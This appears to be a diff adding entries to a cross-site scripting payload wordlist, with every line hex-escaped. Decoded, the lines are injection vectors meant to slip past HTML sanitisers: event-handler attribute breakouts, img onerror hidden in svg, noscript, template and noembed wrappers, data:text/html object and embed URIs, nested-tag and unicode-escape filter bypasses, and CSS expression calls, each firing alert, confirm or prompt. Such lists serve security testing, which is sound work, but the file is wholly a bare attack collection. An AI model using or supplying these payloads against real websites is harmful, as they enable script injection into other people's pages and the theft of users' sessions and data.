+\x27\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x78\x3d\x27
+\x27\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x78\x3d\x27
+\x27\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x78\x3d\x27
+\x22\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x6f\x6e\x63\x6c\x69\x63\x6b\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x6f\x6e\x63\x6c\x69\x63\x6b\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x6f\x6e\x63\x6c\x69\x63\x6b\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x78\x3d\x22
+\x3c\x73\x76\x67\x3e\x3c\x70\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x2f\x70\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x73\x76\x67\x3e\x3c\x70\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x2f\x70\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x73\x76\x67\x3e\x3c\x70\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x2f\x70\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x70\x20\x74\x69\x74\x6c\x65\x3d\x22\x3c\x2f\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x22\x3e
+\x3c\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x70\x20\x74\x69\x74\x6c\x65\x3d\x22\x3c\x2f\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x22\x3e
+\x3c\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x70\x20\x74\x69\x74\x6c\x65\x3d\x22\x3c\x2f\x6e\x6f\x73\x63\x72\x69\x70\x74\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x22\x3e
+\x3c\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e
+\x3c\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e
+\x3c\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x74\x65\x6d\x70\x6c\x61\x74\x65\x3e
+\x3c\x6e\x6f\x65\x6d\x62\x65\x64\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x65\x6d\x62\x65\x64\x3e
+\x3c\x6e\x6f\x65\x6d\x62\x65\x64\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x65\x6d\x62\x65\x64\x3e
+\x3c\x6e\x6f\x65\x6d\x62\x65\x64\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x65\x6d\x62\x65\x64\x3e
+\x3c\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e
+\x3c\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e
+\x3c\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x6e\x6f\x66\x72\x61\x6d\x65\x73\x3e
+\x3c\x78\x73\x73\x20\x69\x64\x3d\x78\x20\x74\x61\x62\x69\x6e\x64\x65\x78\x3d\x31\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x78\x73\x73\x3e
+\x3c\x78\x73\x73\x20\x69\x64\x3d\x78\x20\x74\x61\x62\x69\x6e\x64\x65\x78\x3d\x31\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x78\x73\x73\x3e
+\x3c\x78\x73\x73\x20\x69\x64\x3d\x78\x20\x74\x61\x62\x69\x6e\x64\x65\x78\x3d\x31\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x78\x73\x73\x3e
+\x3c\x76\x69\x64\x65\x6f\x3e\x3c\x73\x6f\x75\x72\x63\x65\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x3c\x2f\x76\x69\x64\x65\x6f\x3e
+\x3c\x76\x69\x64\x65\x6f\x3e\x3c\x73\x6f\x75\x72\x63\x65\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x3c\x2f\x76\x69\x64\x65\x6f\x3e
+\x3c\x76\x69\x64\x65\x6f\x3e\x3c\x73\x6f\x75\x72\x63\x65\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x3c\x2f\x76\x69\x64\x65\x6f\x3e
+\x3c\x6f\x62\x6a\x65\x63\x74\x20\x64\x61\x74\x61\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x6f\x62\x6a\x65\x63\x74\x3e
+\x3c\x6f\x62\x6a\x65\x63\x74\x20\x64\x61\x74\x61\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x6f\x62\x6a\x65\x63\x74\x3e
+\x3c\x6f\x62\x6a\x65\x63\x74\x20\x64\x61\x74\x61\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x6f\x62\x6a\x65\x63\x74\x3e
+\x3c\x65\x6d\x62\x65\x64\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x3c\x65\x6d\x62\x65\x64\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x3c\x65\x6d\x62\x65\x64\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x3c\x73\x63\x72\x3c\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x3c\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x3c\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x5c\x75\x30\x30\x36\x35\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x5c\x75\x30\x30\x36\x36\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x5c\x75\x30\x30\x36\x44\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x77\x69\x6e\x64\x6f\x77\x5b\x27\x61\x6c\x27\x25\x32\x42\x27\x65\x72\x74\x27\x5d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x77\x69\x6e\x64\x6f\x77\x5b\x27\x63\x6f\x6e\x27\x25\x32\x42\x27\x66\x69\x72\x6d\x27\x5d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x73\x63\x72\x69\x70\x74\x3e\x77\x69\x6e\x64\x6f\x77\x5b\x27\x70\x72\x6f\x27\x25\x32\x42\x27\x6d\x70\x74\x27\x5d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x67\x6c\x6f\x62\x61\x6c\x54\x68\x69\x73\x5b\x27\x61\x6c\x65\x72\x74\x27\x5d\x28\x31\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x67\x6c\x6f\x62\x61\x6c\x54\x68\x69\x73\x5b\x27\x63\x6f\x6e\x66\x69\x72\x6d\x27\x5d\x28\x31\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x67\x6c\x6f\x62\x61\x6c\x54\x68\x69\x73\x5b\x27\x70\x72\x6f\x6d\x70\x74\x27\x5d\x28\x31\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x73\x74\x79\x6c\x65\x3d\x78\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x61\x6c\x65\x72\x74\x28\x31\x29\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x73\x74\x79\x6c\x65\x3d\x78\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x73\x74\x79\x6c\x65\x3d\x78\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x29\x3e
